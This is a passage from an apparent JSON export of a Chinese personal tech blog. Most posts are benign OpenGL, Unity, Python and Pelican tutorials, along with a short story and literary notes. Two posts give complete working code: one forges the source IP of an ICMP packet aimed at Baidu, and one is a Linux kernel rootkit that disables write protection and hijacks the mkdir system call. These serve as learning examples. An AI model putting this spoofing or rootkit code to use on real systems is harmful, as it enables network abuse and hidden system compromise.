这里本来要绘制一个(0,0)位置开始宽高都为200的矩形，加上glScissor语句后，只绘制从(50, 50)开始宽高都为50的这部分区域。","tags":"OpenGL","url":"http://www.vmetu.com/blog/glscissorhan-shu.html"},{"title":"VS中Error C2001的解决办法","text":"VS中Error C2001的解决办法 今天遇到一个问题，在VS2010工程中，出现中文字符串时，出现了如下错误： error C2001 : newline in constant error C2143 : syntax error : missing ')' before '}' error C2143 : syntax error : missing ';' before '}' 产生原因可以参照： http://blog.163.com/zhaowenjia1989@126/blog/static/1094985792010224153119/ 一些结局办法可以参照： http://www.cnblogs.com/kuliuheng/p/3397796.html 还有一个简单的办法： 1. 在VS中打开该代码文件。 2. 选择VS菜单栏中 File -> Advanced Save Options 选择中文的编码： 重新编译，OK","tags":"编程语言","url":"http://www.vmetu.com/blog/vszhong-error-c2001de-jie-jue-ban-fa.html"},{"title":"Mathf相关函数","text":"这里对Mathf相关函数做一个简要说明，抄的。 Mathf.Abs绝对值## 计算并返回指定参数 f 绝对值。 Mathf.Acos反余弦 static function Acos (f : float) : float 以弧度为单位计算并返回参数 f 中指定的数字的反余弦值。 Mathf.Approximately近似 static function Approximately (a : float, b: float) : bool 比较两个浮点数值，看它们是否非常接近, 由于浮点数值不精确，不建议使用等于来比较它们。例如，1.0==10.0/10.0也许不会返回true。 public class example : MonoBehaviour { publicvoid Awake() { if(Mathf.Approximately(1.0F, 10.0F / 10.0F)) print(\"same\"); } } Mathf.Asin反正弦 static function Asin (f : float) : float 以弧度为单位计算并返回参数 f 中指定的数字的反正弦值。 Mathf.Atan2反正切 static function Atan2 (y : float, x :float) : float 以弧度为单位计算并返回 y/x 的反正切值。返回值表示相对直角三角形对角的角，其中 x 是临边边长，而 y 是对边边长。 返回值是在x轴和一个二维向量开始于0个结束在(x,y)处之间的角。 public class example : MonoBehaviour { publicTransform target; voidUpdate() { Vector3relative = transform.InverseTransformPoint(target.position); floatangle = Mathf.Atan2(relative.x, relative.z) * Mathf.Rad2Deg; transform.Rotate(0,angle, 0); } } Mathf.Atan反正切 static function Atan (f : float) :float 计算并返回参数 f 中指定的数字的反正切值。返回值介于负二分之 pi 与正二分之 pi 之间。 Mathf.CeilToInt最小整数 static function CeilToInt (f : float) : int 返回最小的整数大于或等于f。 Mathf.Ceil上限值 static function Ceil (f : float) : float 返回 f 指定数字或表达式的上限值。数字的上限值是大于等于该数字的最接近的整数。 Mathf.Clamp01 static function Clamp01 (value : float) :float 限制value在0,1之间并返回value。如果value小于0，返回0。如果value大于1,返回1，否则返回value 。 Mathf.Clamp static function Clamp (value : float, min :float, max : float) : float 限制value的值在min和max之间， 如果value小于min，返回min。 如果value大于max，返回max，否则返回value static function Clamp (value : int, min :int, max : int) : int 限制value的值在min和max之间，并返回value。 Mathf.ClosestPowerOfTwo最近的二次方 static function ClosestPowerOfTwo (value :int) : int 返回距离value最近的2的次方数。 Mathf.Cos余弦 static function Cos (f : float) : float 返回由参数 f 指定的角的余弦值（介于 -1.0 与 1.0 之间的值）。 Mathf.Deg2Rad度转弧度 static var Deg2Rad : float 度到弧度的转化常量。（只读） 这等于(PI * 2) / 360。 Mathf.Mathf.Rad2Deg 弧度转度 static var Rad2Deg : float 弧度到度的转化常量。（只读） 这等于 360 / (PI * 2)。 Mathf.DeltaAngle增量角 static function DeltaAngle (current :float, target : float) : float 计算给定的两个角之间最短的差异。 // Prints 90 Debug.Log(Mathf.DeltaAngle(1080,90)); Mathf.Epsilon小正数 static var Epsilon : float 一个很小的浮点数值。（只读） 最小的浮点值，不同于0。 以下规则： - anyValue + Epsilon = anyValue - anyValue - Epsilon = anyValue - 0 + Epsilon = Epsilon - 0 - Epsilon = -Epsilon 一个在任意数和Epsilon的之间值将导致在任意数发生截断误差。 public class example : MonoBehaviour { boolisEqual(float a, float b) { if(a >= b - Mathf.Epsilon && a <= b + Mathf.Epsilon) returntrue; else returnfalse; } } Mathf.Exp指数 static function Exp (power : float) : float 返回 e 的 power 次方的值。 Mathf.FloorToInt最大整数 static function FloorToInt (f : float) :int 返回最大的整数，小于或等于f。 Mathf.Floor下限值 static function Floor (f : float) : float 返回参数 f 中指定的数字或表达式的下限值。下限值是小于等于指定数字或表达式的最接近的整数。 Mathf.Infinity正无穷 static var Infinity : float 表示正无穷，也就是无穷大，∞ （只读） Mathf.InverseLerp反插值 计算两个值之间的Lerp参数。也就是value在from和to之间的比例值。 //现在参数是3/5 float parameter =Mathf.InverseLerp(walkSpeed, runSpeed, speed); Mathf.IsPowerOfTwo是否2的幂 static function IsPowerOfTwo (value : int): bool 如果该值是2的幂，返回true。 // prints false Debug.Log(Mathf.IsPowerOfTwo(7)); // prints true Debug.Log(Mathf.IsPowerOfTwo(32)); Mathf.LerpAngle插值角度 static function LerpAngle (a : float, b :float, t : float) : float 和Lerp的原理一样，当他们环绕360度确保插值正确。 a和b是代表度数。 public class example : MonoBehaviour { publicfloat minAngle = 0.0F; publicfloat maxAngle = 90.0F; voidUpdate() { floatangle = Mathf.LerpAngle(minAngle, maxAngle, Time.time); transform.eulerAngles= new Vector3(0, angle, 0); } } Mathf.Lerp插值 static function Lerp (from : float, to :float, t : float) : float 基于浮点数t返回a到b之间的插值，t限制在0～1之间。 当t = 0返回from，当t = 1 返回to。当t = 0.5 返回from和to的平均值。 Mathf.Log10基数10的对数 static function Log10 (f : float) : float 返回f的对数，基数为10。 Mathf.Log对数 static function Log (f : float, p : float): float 返回参数 f 的对数。 // logarithm of 6 in base 2 //以2为底6的对数 // prints 2.584963 print(Mathf.Log(6, 2)); Mathf.Max最大值 static function Max (a : float, b : float): float static function Max (params values :float[]) : float 返回两个或更多值中最大的值。 Mathf.Min最小值 static function Min (a : float, b : float): float static function Min (params values :float[]) : float 返回两个或更多值中最小的值。 Mathf.MoveTowardsAngle移动角 static function MoveTowardsAngle (current :float, target : float, maxDelta : float) : float 像MoveTowards,但是当它们环绕360度确保插值正确。 变量current和target是作为度数。为优化原因，maxDelta负值的不被支持，可能引起振荡。从target角推开current，添加180度角代替。 Mathf.MoveTowards移向 static function MoveTowards (current :float, target : float, maxDelta : float) : float 改变一个当前值向目标值靠近。 这实际上和 Mathf.Lerp相同，而是该函数将确保我们的速度不会超过maxDelta。maxDelta为负值将目标从推离。 Mathf.NegativeInfinity负无穷 static var NegativeInfinity : float 表示负无穷，也就是无穷小，-∞（只读） Mathf.NextPowerOfTwo下个2的幂 Mathf.PingPong乒乓 static function PingPong (t : float, length: float) : float 0到length之间往返。t值永远不会大于length的值，也永远不会小于0。 The returned value will move back and forthbetween 0 and length. 返回值将在0和length之间来回移动。 Mathf.PI圆周率 static var PI : float PI（读pai）的值，也就是圆周率（π）的值3.14159265358979323846...（只读） Mathf.Pow次方 static function Pow (f : float, p : float): float 计算并返回 f 的 p 次方。 Mathf.Repeat重复 static function Repeat (t : float, length :float) : float 循环数值t，0到length之间。t值永远不会大于length的值，也永远不会小于0。 这是类似于模运算符，但可以使用浮点数。 public class example : MonoBehaviour { voidUpdate() { transform.position= new Vector3(Mathf.Repeat(Time.time, 3), transform.position.y,transform.position.z); } } Mathf.RoundToInt四舍五入到整数 static function RoundToInt (f : float) :int 返回 f 指定的值四舍五入到最近的整数。 如果数字末尾是.5，因此它是在两个整数中间，不管是偶数或是奇数，将返回偶数。 Mathf.Round四舍五入 static function Round (f : float) : float 返回浮点数 f 进行四舍五入最接近的整数。 如果数字末尾是.5，因此它是在两个整数中间，不管是偶数或是奇数，将返回偶数。 Mathf.Sign符号 static function Sign (f : float) : float 返回 f 的符号。 当 f 为正或为0返回1，为负返回-1。 Mathf.Sin正弦 static function Sin (f : float) : float 计算并返回以弧度为单位指定的角 f 的正弦值。 Mathf.SmoothDampAngle平滑阻尼角度 static function SmoothDampAngle (current :float, target : float, ref currentVelocity : float, smoothTime : float,maxSpeed : float = Mathf.Infinity, deltaTime : float = Time.deltaTime) : float 参数 current : 当前的位置。 target : 我们试图达到的位置。 currentVelocity : 当前速度，这个值在你访问这个函数的时候会被随时修改。 smoothTime : 要到达目标位置的近似时间，实际到达目标时要快一些。 maxSpeed : 可选参数，允许你限制的最大速度。 deltaTime : 上次调用该函数到现在的时间。缺省为Time.deltaTime。 随着时间的推移逐渐改变一个给定的角度到期望的角度。 这个值通过一些弹簧减震器类似的功能被平滑。这个函数可以用来平滑任何一种值，位置，颜色，标量。最常见的是平滑一个跟随摄像机。 //一个简单的平滑跟随摄像机 //跟随目标的朝向 public class example : MonoBehaviour { publicTransform target; publicfloat smooth = 0.3F; publicfloat distance = 5.0F; privatefloat yVelocity = 0.0F; voidUpdate() { //从目前的y角度变换到目标y角度 floatyAngle = Mathf.SmoothDampAngle(transform.eulerAngles.y, target.eulerAngles.y,ref yVelocity, smooth); //target的位置 Vector3position = target.position; //然后，新角度之后的距离偏移 position+= Quaternion.Euler(0, yAngle, 0) * new Vector3(0, 0, -distance); //应用位置 transform.position= position; //看向目标 transform.LookAt(target); } } Mathf.SmoothDamp平滑阻尼 static function SmoothDamp (current :float, target : float, ref currentVelocity : float, smoothTime : float,maxSpeed : float = Mathf.Infinity, deltaTime : float = Time.deltaTime) : float 参数 current : 当前的位置。 target : 我们试图达到的位置。 currentVelocity : 当前速度，这个值在你访问这个函数的时候会被随时修改。 smoothTime : 要到达目标位置的近似时间，实际到达目标时要快一些。 maxSpeed : 可选参数，允许你限制的最大速度。 deltaTime : 上次调用该函数到现在的时间。缺省为Time.deltaTime。 描述 随着时间的推移逐渐改变一个值到期望值。 这个值就像被一个不会崩溃的弹簧减振器一样被平滑。这个函数可以用来平滑任何类型的值，位置，颜色，标量。 public class example : MonoBehaviour { publicTransform target; publicfloat smoothTime = 0.3F; privatefloat yVelocity = 0.0F; voidUpdate() { floatnewPosition = Mathf.SmoothDamp(transform.position.y, target.position.y, refyVelocity, smoothTime); transform.position= new Vector3(transform.position.x, newPosition, transform.position.z); } } Mathf.SmoothStep平滑插值 static function SmoothStep (from : float,to : float, t : float) : float 和lerp类似，在最小和最大值之间的插值，并在限制处渐入渐出。 public class example : MonoBehaviour { publicfloat minimum = 10.0F; publicfloat maximum = 20.0F; voidUpdate() { transform.position= new Vector3(Mathf.SmoothStep(minimum, maximum, Time.time), 0, 0); } } Mathf.Sqrt平方根 static function Sqrt (f : float) : float 计算并返回 f 的平方根。 Mathf.Tan正切 static function Tan (f : float) : float 计算并返回以弧度为单位 f 指定角度的正切值。","tags":"Unity","url":"http://www.vmetu.com/blog/mathfxiang-guan-han-shu.html"},{"title":"Unity2D帧动画实现的两种方式","text":"在游戏制作过程中，经常用到帧动画，这里介绍两种实现帧动画的方式 源材料准备 序列帧所用到的图片： 生成这些序列帧所用到的资源可以参考： http://www.raywenderlich.com/61532/unity-2d-tutorial-getting-started 1. 脚本方式实现 脚本实现的方式在上面的链接中有介绍，这里把列出源码： using UnityEngine; using System.Collections; public class Zombie : MonoBehaviour { public Sprite[] m_sprits; public int m_frameRate; ／／帧率 float m_frameTime; SpriteRenderer m_spriteRenderer; // Use this for initialization void Start () { m_frameTime = 1.0f / (float)m_frameRate; m_spriteRenderer = GetComponent<SpriteRenderer> (); } // Update is called once per frame void Update () { m_frameTime -= Time.deltaTime; if (m_frameTime < 0.0f) { int index = 0; for (; index < m_sprits.Length; index ++ ) { if (m_sprits[index] == m_spriteRenderer.sprite) { break; } } index = (index + 1) % m_sprits.Length; m_spriteRenderer.sprite = m_sprits[index]; m_frameTime = 1.0f / (float)m_frameRate; } } } 2.编辑器实现 帧动画也可以由Unity的动画编辑器来实现，实现方式如下。 打开动画编辑器 先在场景中以序列帧的第一帧创建一个精灵，选中它，然后通过快捷键Ctrl + 6 或者菜单中的 Window -> Animation打开动画编辑器。在弹出窗口的左上角点击 Add Property , 会弹出一个让你保存动画的界面，如图： 输入一个名字将其保存起来。 根据上面程序实现的方法，我们知道绘制精灵是通过SpriteRender来实现的, 所以在动画编辑器中可以增加一个SpriteRender属性： 之后就可以将序列帧拖入动画编辑器中： 加好之后，点击左上角的三角符号，就可以发现Unity编辑器中的僵尸动起来了。","tags":"Unity","url":"http://www.vmetu.com/blog/unity2dzheng-dong-hua-shi-xian-de-liang-chong-fang-shi.html"},{"title":"Pelican安装过程","text":"今天安装了Pelican，下面来说下过程和遇到的问题 安装Python，因为在Mac下，省掉这一步 安装pip( 下载地址 ), 解压后运行： python setup.py install 安装 安装pelican， 运行 pip install pelican 安装markdown， 运行 pip install markdown 启动pelican创建工程，pelican－quickstart, 此时有可能出现如下错误： Traceback ( most recent call last ): File \"/usr/local/bin/pelican-quickstart\" , line 7 , in < module > from pelican.tools.pelican_quickstart import main File \"/Library/Python/2.7/site-packages/pelican/__init__.py\" , line 20 , in < module > from pelican.generators import ( ArticlesGenerator , PagesGenerator , File \"/Library/Python/2.7/site-packages/pelican/generators.py\" , line 22 , in < module > from pelican.readers import Readers File \"/Library/Python/2.7/site-packages/pelican/readers.py\" , line 24 , in < module > from six.moves.html_parser import HTMLParser ImportError : No module named html_parser 这时只需要更改一下源文件即可： vim /Library/Python/2.7/site-packages/pelican/readers.py 。 将24行的： from six.moves.html_parser import HTMLParser 换成： from HTMLParser import HTMLParser 即可","tags":"Pelican","url":"http://www.vmetu.com/blog/pelicanan-zhuang-guo-cheng.html"},{"title":"一个能处理json的FieldStorage","text":"一个能处理json的FieldStorage @(编程语言)[python] 一般的，FieldStorage是不能处理Json请求的，这里可以改写它的一个方法，使其具备接收json请求的能力。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #!/usr/bin/env python #encoding:utf-8 import cgi import urlparse import json import os class JSONFieldStorage ( cgi . FieldStorage , object ): \"\"\" FieldStorage类的改写，使其具有接收json的能力 \"\"\" def read_urlencoded ( self ): \"\"\"Internal: read data in query string format.\"\"\" qs = self . fp . read ( self . length ) try : self . _json = json . loads ( qs ) except Exception , e : self . _json = None if self . _json == None : try : self . _json = json . loads ( self . qs_on_post ) except : self . _json = None if self . qs_on_post : qs += '&' + self . qs_on_post self . list = list = [] for key , value in urlparse . parse_qsl ( qs , self . keep_blank_values , self . strict_parsing ): list . append ( cgi . MiniFieldStorage ( key , value )) self . skip_lines () def getJson ( self ): try : return self . _json except : return None 使用方法和FieldStorage一致，要得到json请求时只需要调用getJson即可","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-neng-chu-li-jsonde-fieldstorage.html"},{"title":"linux下伪装ICMP攻击的实现","text":"linux下伪装ICMP攻击的实现 @(编程语言)[信息安全, C] #include <sys/socket.h> #include <sys/types.h> #include <netinet/ip.h> #include <netinet/ip_icmp.h> #include <string.h> #include \"exam.h\" char buffer [ 1024 ]; /*校验码的计算*/ unsigned short cksum ( unsigned char * data , int len ) { int sum = 0 ; int odd = len & 0x01 ; unsigned short * value = ( unsigned short * ) data ; while ( len & 0xfffe ) { sum += * ( unsigned short * ) data ; data += 2 ; len -= 2 ; } if ( odd ) { unsigned short tmp = (( * data ) << 8 ) & 0xff00 ; sum += tmp ; } sum = ( sum >> 16 ) + ( sum & 0xffff ); sum += ( sum >> 16 ) ; return ~ sum ; } int main () { int s ; int ret = 0 ; int on = 1 ; struct icmp * icmp ; struct ip * ip = ( struct ip * ) buffer ; struct sockaddr_in addr ; s = socket ( AF_INET , SOCK_RAW , 1 ); //使用原始套接字 failure ( \"socket\" , s , - 1 ); memset ( buffer , '\\0' , 1024 ); addr . sin_family = AF_INET ; addr . sin_addr . s_addr = inet_addr ( \"119.75.213.51\" ); //百度的ip，目的是伪造IP地址给百度发数据包 ret = setsockopt ( s , IPPROTO_IP , IP_HDRINCL , & on , sizeof ( on )); //自己构造ip头的选项 failure ( \"setsockopt\" , ret , - 1 ); /*ip头的信息*/ ip -> ip_hl = 5 ; ip -> ip_v = 4 ; ip -> ip_tos = 0 ; ip -> ip_len = htons ( 32 ); ip -> ip_id = 0 ; ip -> ip_off = 0 ; ip -> ip_ttl = 56 ; ip -> ip_p = 1 ; ip -> ip_sum = 0 ; ip -> ip_src . s_addr = inet_addr ( \"192.168.205.199\" ); //这是伪造的ip，本机的ip当然不是这个啦 ip -> ip_dst . s_addr = inet_addr ( \"119.75.213.51\" ); /*icmp头信息*/ icmp = ( struct icmp * )( buffer + 20 ); icmp -> icmp_type = ICMP_ECHO ; icmp -> icmp_code = 0 ; icmp -> icmp_cksum = 0 ; icmp -> icmp_id = 1234 ; icmp -> icmp_seq = 8080 ; icmp -> icmp_cksum = cksum (( char * ) icmp , 12 ); /*发送*/ ret = sendto ( s , buffer , 32 , 0 , ( struct sockaddr * ) & addr , sizeof ( addr )); failure ( \"send\" , ret , - 1 ); return 0 ; } PS: exam.h是我为了些程序方便而定义的一些错误处理的宏，文件内容如下： #ifndef EXAM_H #define EXAM_H #include <stdio.h> #include <stdlib.h> #define failure(msg, ret, error_code) \\ { \\ if(ret == error_code) \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } \\ } #define success(msg, ret, success_code)\\ { \\ if(ret != success_code) \\ { \\ perror(msg); \\ exit(EXIT_FAILURE); \\ } \\ } #endif","tags":"编程语言","url":"http://www.vmetu.com/blog/linuxxia-wei-zhuang-icmpgong-ji-de-shi-xian.html"},{"title":"一个简单的linux rootkit","text":"一个简单的linux rootkit @(编程语言)[信息安全, Linux, rootkit] 下面提供一个相对完整的rootkit，在Fedora 12上编译运行成功。 #include <linux/module.h> #include <linux/kernel.h> #include <asm/unistd.h> MODULE_LICENSE ( \"GPL\" ); // addr of sys_call_talbe = 0xc077e3a8，这个值是在/boot目录下，System.map或是以System.map打头的文件中找到的。 void ** sys_call_table = ( void ** ) 0xc077e3a8 ; int ( * orig_mkdir )( const char * path ); //定义一个函数指正，用于保存挟制以前的初始值 int hack_mkdir ( const char * path ) //定义一个替换函数，它将用来替换某个系统调用 { printk ( \"<0> this is in hack_mkdir \\n \" ); return 0 ; } 下面两个函数比较重要，因为在较新的内核中，sys_call_table的内存是只读的，详见entry_32.S: .section .rodata , \"a\" #include \"syscall_table_32.S\" 但我们可以通过该cr0寄存器的第16位来取消写保护，cr0寄存器如下： 第16位WP位，它控制是否允许处理器向标志为只读属性的内存页写入数据，如果WP=0, 禁用写保护功能。 unsigned int clear_cr0(void) // 将WP清0，并返回清0前的值 { unsigned int cr0 = 0; unsigned int ret; asm volatile(\"movl %%cr0, %%eax\" :\"=a\"(cr0) ); ret = cr0; cr0 &= 0xfffeffff; asm volatile(\"movl %%eax, %%cr0\" : :\"a\"(cr0) ); return ret; } void setback_cr0(unsigned int val) // 将cr0设为val { asm volatile(\"movl %%eax, %%cr0\" : :\"a\"(val) ); } static int __init begin(void) { unsigned int cr0; orig_mkdir = sys_call_table[__NR_mkdir]; //保存mkdir原来的的地址 printk(\"<0> sys_call_table[__NR_mkdir] = %x\\n\", (unsigned int)sys_call_table[__NR_mkdir]); cr0 = clear_cr0(); sys_call_table[__NR_mkdir] = hack_mkdir; //挟持 setback_cr0(cr0); printk(\"<0> sys_call_table[__NR_mkdir] = %x\\n\", (unsigned int)sys_call_table[__NR_mkdir]); return 0; } static void __exit end(void) { int cr0; cr0 = clear_cr0(); sys_call_table[__NR_mkdir] = orig_mkdir; //恢复mkdir系统调用 setback_cr0(cr0); } module_init(begin); module_exit(end); 运行效果： 加载模块后，mkdir命令失效。","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-jian-dan-de-linux-rootkit.html"},{"title":"梦蝶","text":"梦蝶 @(杂七杂八)[胡思乱想] 那只蝴蝶又来了。 不知是蝴蝶闯入了他的梦，还是他的梦里有蝴蝶。 他依旧伸出了手去捕那只蝶，那蝶也依旧漂亮地一转，飞到他手不能及的地方，他依旧去追。 也是依旧的，他或是绊了石头，或是踩了鞋带，或是挂了树枝，惊出了一身冷汗，喘着粗气醒了来。 他对这个梦不能释怀已经很久了，每次醒来，心里总是空空的，过了许久，仍觉得少了些东西，但仔细去一想，却又真的想不去来。 他也要回故土了，他在年轻的时候对回乡定居的老人是很不屑的。谁知，他老了也不例外。他常想，这可能是他一生中最有讽刺意味的一件事。离开家乡有快有半个世纪了，年轻的时候东奔西闯的，对什么事都放得开，谁知老了老了却越发执着了。 儿子在给他准备着行李，他随便看了看，便走了出去。在不远处的公园，他找了张椅子坐下来，静静地看这草地上玩耍的小孩子。他一直觉得与小孩子们相处得久了，自己也会变的年青。忽然，他兴奋起来，那几个孩子竟在追逐一只蝴蝶！ 那只蝴蝶就如他在梦中看到的那只一样，翩翩然地飞着，没当孩子们的手靠近，它也是漂亮地一转身，飞到一个意所不及的地方，却又不飞远，好像它出来就是来和孩子们玩一样。渐渐地，孩子们被蝴蝶引出了草坪，在公园的路上跑起来。他笑了：在梦中，他不是和这些孩子一样么？ 路边上的几对恋人，也觉得有趣，便也加入了这捕蝶的行列中。大家跑着，笑着，闹着，都在围着那只蝴蝶打转。他几乎就要站起来，跑到他们中间去，和他们一起去捕那只蝶。他注意到自己的意图，不禁一笑：你还以为自己年青啊？你现在还有他们的身手么？要是真落个像梦一般的下场，那可能真是晚节不保了。这时，他却又不服：我在年青的时候，那是一定捕得到的！ 年青？他心头一震，我也年青过啊！蓦地，他明白了，他明白他为什么若有所失了，他再也不能重回他的青春时代了，就像那只蝴蝶，只可回味，却是永远不能企及的！家乡啊，自己年青时的梦想，年青时的时光，都是在那里！哪里是自己想回家乡了，分明是家乡的年青的自己的召唤！还记得么，儿时的小山，少时的玩伴，还有那第一次暗恋的同桌女生，以及新婚时的妻子？ 儿子来叫父亲回去了，却看到坐在长椅中，老泪纵横的他。儿子唤了他一声，良久，他才抬起手，指着已经暗下来的天空：\"那……那逝去的蝴蝶……再也……捕不回来了……\"","tags":"杂七杂八","url":"http://www.vmetu.com/blog/meng-die.html"},{"title":"《聊斋志异》笔记","text":"《聊斋志异》笔记 @(杂七杂八)[读书笔记] 《青凤》中的耿生，是在狂得可以。当他晚上读书时，有个面黑如漆的鬼披着头发走进来，一直瞪耿生看。耿生也不害怕，直接用墨把脸涂黑了也瞪着那个鬼，最后鬼只好惭愧而去。耿生此举，是在令人排案叫绝：所谓来而不往非礼也，你不是黑么，我比你更黑，你瞪我，那我也瞪你，看你还能怎么样。终于，鬼都拿他没办法。同样，《妖术》中的于公也不怕鬼，不过于公的身体素质好一些，能和那卜者\"召唤\"出来的巨鬼搏斗。其中描写他们搏斗的那一节颇有武侠小说的味道。倘若耿生有相当好的功夫，看见鬼时掏把刀出来，说：\"汝面皮黑，宜制墨。\"保管让鬼屁滚尿流而出，岂不快哉！ 《水莽草》讲的是鬼找替身的故事。说一个姓祝的书生被女鬼寇三娘找做了替身，祝生死后\"甚恨之\"，打听到三娘已经投了胎，于是\"驰去，强捉之来\"，最后还讨了三娘做老婆，小日子过得还不错。同样讲到做了鬼还要报仇的是《董生》，董生被一只狐狸迷惑致死后，到阎王那里告了狐狸一状，最后狐狸也没了好下场。这让我有个想法：人不应该怕鬼。就算被鬼给弄死了，还是可以到下面去报复他，不是常说\"我做了厉鬼也不放过你\"么？ 《九山王》则是一篇狐狸报复人的故事，该狐狸和金庸小说中的飞天狐狸有相似之处，难怪机智狡黠皆以狐狸著称。九山王中的老胡为报李生的灭门之仇，撺掇李生发动叛乱，最后李生一家被朝廷诛灭。飞天狐狸也是一直协助吴三桂准备叛乱，不同的是，飞天狐狸却被天下人误会，最后死在自己兄弟手中，诚可痛哉。由是观之，报仇十年不晚之君子，非大智大勇只认不可为也。大智者，谋全局而不谋一域，谋万世而不谋一时；大勇者，忍辱负重，甘当天下唾骂也！ 《张老相公》说的也是报仇的故事。张老相公在给女儿办嫁妆时，妻子女儿都给大鳖吃了。张老相公\"悼恨欲死\"，决心报仇。于是登金山，向和尚打听鳖的情况，谁知这些和尚一个个贪生怕死，为求一时安宁，不惜破戒宰杀牛羊来祭祀大鳖，全无我不入地狱谁入地狱之气概，颇有割地赂秦之古风。传说当初佛祖有割肉喂鹰之举，可能和尚的蠢就是他传下来的。话说回来，张老相公最后烧了百多斤铁，当成祭祀的牛羊喂了那鳖，从此除了一害。这方法让我想起了小时候看的一篇童话故事，好像是两个小孩把烧红的秤砣当水饺喂了一只熊。类似的还有《佣兵天下》中大青山冬天打猎用的方法。人的机智当真为只会吃的畜生所不及的。和尚把大鳖当成神，而张老相公却轻易的灭了它，盖神之为神，人神之耳！ 《夜叉国》倒像一篇游记。该篇说的是商人徐某被海风吹到了一个陌生的国度，那里的人相貌凶恶，吃生肉。刚上岸的时候徐某也差点给他们吃了，好歹徐某也是文明人，有的是夜叉们见不到的好东西，徐某先拿干粮贿赂夜叉，进而煮肉给夜叉吃，慢慢的竟然和夜叉们\"聚处如家人\"，还娶了个夜叉老婆。这和我以前看的《辛巴达游记》有着相似之处，不过辛巴达到的是人的国度，给人造的是马鞍而已。话说徐某还是想回故土，于是趁母夜叉外出时，带着和母夜叉生的一个儿子乘船回去了。看到这里，不禁想到很久以前看的一个故事，说一个男人被一个女野人抓去做了丈夫，还生了一个孩子，结果在男人逃走的时候，野人把孩子撕成两半，扔了一般给男人。但那母夜叉倒是很开明，最后带着孩子跟徐某一起回了大陆，只是\"恨其不谋\"而已。故事的结局是皆大欢喜，母夜叉和儿女们在战场上建功立业，荣华无限。最妙的是蒲松龄最后来了一句：\"家家床头有个夜叉在\"，想来蒲公亦然。","tags":"杂七杂八","url":"http://www.vmetu.com/blog/liao-zhai-zhi-yi-bi-ji.html"}]}